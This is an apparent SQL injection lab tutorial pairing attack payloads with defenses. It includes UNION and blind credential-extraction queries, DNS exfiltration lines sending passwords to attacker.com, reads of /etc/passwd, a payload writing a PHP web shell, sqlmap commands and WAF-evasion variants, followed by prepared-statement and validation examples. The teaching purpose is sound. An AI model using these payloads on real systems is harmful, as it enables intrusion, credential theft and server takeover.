# SQL Injection Lab

## Objective
Understand SQL injection vulnerabilities, learn exploitation techniques, and implement proper defense mechanisms.

## Prerequisites
- Basic SQL knowledge
- Understanding of web applications
- Access to a vulnerable web application (DVWA or similar)

## Lab Overview
In this lab, you will:
1. Understand SQL injection concepts
2. Identify vulnerable parameters
3. Exploit SQL injection vulnerabilities
4. Implement secure coding practices
5. Use prepared statements and input validation

## Part 1: Understanding SQL Injection

### Exercise 1.1: SQL Basics Review
Common SQL statements that are targets for injection:
```sql
-- Authentication query
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';

-- Search query
SELECT * FROM products WHERE name LIKE '%laptop%';

-- Insert query
INSERT INTO comments (user_id, comment) VALUES (1, 'Great product!');

-- Update query
UPDATE users SET email = 'new@email.com' WHERE id = 1;
```

### Exercise 1.2: How SQL Injection Works
Vulnerable code example:
```php
// VULNERABLE CODE - DO NOT USE IN PRODUCTION
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($connection, $query);
```

Attack payload:
```
Username: admin' --
Password: anything
```

Resulting query:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```

## Part 2: Identifying SQL Injection Points

### Exercise 2.1: Manual Testing
Test for SQL injection vulnerabilities:
```
# Basic tests
' 
"
') 
") 
')) 
"))

# Error-based detection
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR 1=1 --

# Time-based detection
'; WAITFOR DELAY '00:00:05' --
' OR SLEEP(5) --
```

### Exercise 2.2: Using SQLMap
Automated SQL injection testing:
```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1"

# POST request
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# Cookie-based
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abcd1234"

# Full scan
sqlmap -u "http://target.com/page.php?id=1" --batch --random-agent
```

## Part 3: Exploitation Techniques

### Exercise 3.1: Union-Based Injection
Extract data using UNION:
```sql
-- Find number of columns
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --

-- Union select
' UNION SELECT null, null, null --
' UNION SELECT 1, 2, 3 --

-- Extract database information
' UNION SELECT 1, database(), 3 --
' UNION SELECT 1, version(), 3 --
' UNION SELECT 1, user(), 3 --

-- Extract table names
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() --

-- Extract column names
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users' --

-- Extract data
' UNION SELECT 1, username, password FROM users --
```

### Exercise 3.2: Blind SQL Injection
Boolean-based blind injection:
```sql
-- Test for true/false conditions
' AND 1=1 --  (page loads normally)
' AND 1=2 --  (page loads differently)

-- Extract data character by character
' AND SUBSTRING(database(),1,1)='a' --
' AND SUBSTRING(database(),1,1)='b' --
' AND ASCII(SUBSTRING(database(),1,1))>97 --

-- Automated extraction script
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
```

### Exercise 3.3: Time-Based Blind Injection
When no visible output changes:
```sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0) --
' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0) --

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- SQL Server
'; IF (1=1) WAITFOR DELAY '00:00:05' --
```

## Part 4: Advanced Exploitation

### Exercise 4.1: Second-Order SQL Injection
```php
// Registration (stores malicious input)
Username: admin'--
Password: password123

// Later query (executes injection)
$query = "SELECT * FROM messages WHERE recipient = '$username'";
```

### Exercise 4.2: Out-of-Band Exploitation
DNS exfiltration:
```sql
-- MySQL (Windows)
' OR LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a')) --

-- SQL Server
'; EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\a' --
```

### Exercise 4.3: File System Access
```sql
-- Read files (MySQL)
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3 --

-- Write files (MySQL)
' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3 INTO OUTFILE '/var/www/html/shell.php' --
```

## Part 5: Defense Mechanisms

### Exercise 5.1: Prepared Statements
Secure code examples:

**PHP with PDO:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$user = $stmt->fetch();
```

**Java with PreparedStatement:**
```java
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(sql);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

**Python with psycopg2:**
```python
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)
```

### Exercise 5.2: Input Validation
```php
// Whitelist validation
function validateInput($input, $type) {
    switch($type) {
        case 'id':
            return filter_var($input, FILTER_VALIDATE_INT);
        case 'email':
            return filter_var($input, FILTER_VALIDATE_EMAIL);
        case 'alphanumeric':
            return preg_match('/^[a-zA-Z0-9]+$/', $input);
        default:
            return false;
    }
}

// Escape special characters
$username = mysqli_real_escape_string($connection, $_POST['username']);
```

### Exercise 5.3: Stored Procedures
```sql
-- Create stored procedure
DELIMITER //
CREATE PROCEDURE AuthenticateUser(
    IN p_username VARCHAR(50),
    IN p_password VARCHAR(255)
)
BEGIN
    SELECT * FROM users 
    WHERE username = p_username 
    AND password = p_password;
END //
DELIMITER ;

-- Call from application
CALL AuthenticateUser(?, ?);
```

## Part 6: WAF Bypass Techniques

### Exercise 6.1: Common WAF Evasion
```sql
-- Case manipulation
' UnIoN SeLeCt 1,2,3 --

-- Comments
' UN/**/ION SEL/**/ECT 1,2,3 --

-- Encoding
' %55NION %53ELECT 1,2,3 --

-- Alternative syntax
' UNION ALL SELECT 1,2,3 --
' UNION DISTINCT SELECT 1,2,3 --

-- Scientific notation
' UNION SELECT 1e0, 2e0, 3e0 --
```

### Exercise 6.2: Advanced Evasion
```sql
-- Using functions
' AND CHAR(65)||CHAR(66)||CHAR(67) = CHAR(65)||CHAR(66)||CHAR(67) --

-- Buffer overflow attempts
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --

-- Time-based with variations
'; DECLARE @q NVARCHAR(4000); SET @q = 'WAITFOR DELAY ''00:00:05'''; EXEC(@q) --
```

## Lab Challenges

### Challenge 1: Authentication Bypass
Bypass the login form without knowing credentials:
- Find the injection point
- Craft a payload to bypass authentication
- Document the vulnerability

### Challenge 2: Data Extraction
Extract all user data from the database:
- Enumerate database structure
- Extract table names
- Dump user credentials
- Do it blindly (no UNION)

### Challenge 3: Secure Code Review
Review and fix the following vulnerable code:
```php
// Vulnerable code
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $id";
$result = mysqli_query($conn, $query);

// Fix this code with multiple defense layers
```

## Testing Checklist

### SQL Injection Test Cases:
- [ ] Integer-based injection
- [ ] String-based injection
- [ ] Blind injection (boolean)
- [ ] Blind injection (time-based)
- [ ] Second-order injection
- [ ] UNION-based injection
- [ ] Error-based injection
- [ ] Out-of-band injection
- [ ] Stacked queries
- [ ] Stored procedure injection

### Defense Implementation:
- [ ] Prepared statements
- [ ] Input validation
- [ ] Least privilege database user
- [ ] Error handling
- [ ] WAF rules
- [ ] Code review
- [ ] Security testing

## Best Practices

### Development Guidelines:
1. **Never concatenate user input** into SQL queries
2. **Always use parameterized queries**
3. **Validate and sanitize all input**
4. **Use least privilege principle** for database accounts
5. **Disable dangerous functions** (xp_cmdshell, LOAD_FILE)
6. **Implement proper error handling**
7. **Regular security audits**

### Security Controls:
- Input validation (whitelist approach)
- Parameterized queries/prepared statements
- Stored procedures
- Escaping user input
- Least privilege database access
- Web Application Firewall (WAF)
- Regular patching and updates

## Conclusion
This lab demonstrated:
- SQL injection attack techniques
- Vulnerability identification methods
- Exploitation approaches
- Defense mechanisms
- Secure coding practices

Remember: Understanding these attacks helps build better defenses. Always use this knowledge ethically and legally.

## Additional Resources
- OWASP SQL Injection Prevention Cheat Sheet
- SQLMap Documentation
- CWE-89: SQL Injection
- Portswigger SQL Injection Tutorial 